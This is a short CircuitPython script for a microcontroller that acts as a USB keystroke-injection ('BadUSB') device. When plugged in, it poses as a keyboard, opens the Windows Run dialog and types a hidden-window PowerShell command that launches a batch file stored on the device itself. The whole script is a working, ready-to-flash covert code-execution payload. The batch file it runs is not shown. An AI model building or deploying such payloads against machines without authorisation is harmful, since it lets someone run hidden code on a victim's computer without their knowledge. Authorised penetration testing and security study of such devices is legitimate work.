import time
import usb_hid
import board
import digitalio
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# --- CONFIGURATION ---
TARGET_DRIVE = "CIRCUITPY"
# Path to the file RELATIVE to the drive letter
# Now pointing to ROOT folder -> Start.bat
TARGET_FILE  = "ROOT\\Start.bat"

# --- SETUP ---
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# LED Setup (Pin 25 is standard Blue LED)
led = digitalio.DigitalInOut(board.GP25)
led.direction = digitalio.Direction.OUTPUT

# --- PAYLOAD ---
led.value = True

# 1. WAIT FOR MOUNT
time.sleep(3.0) 

# 2. OPEN RUN DIALOG
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.5)

# 3. EXECUTE COMMAND
# Finds drive 'CIRCUITPY' and runs ROOT\Start.bat
cmd = f"powershell -W Hidden -C \"$d=(Get-Volume -FileSystemLabel '{TARGET_DRIVE}').DriveLetter; if($d){{Start-Process ($d+':\\{TARGET_FILE}')}}\""
layout.write(cmd)

# 4. ENTER
time.sleep(0.5)
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

led.value = False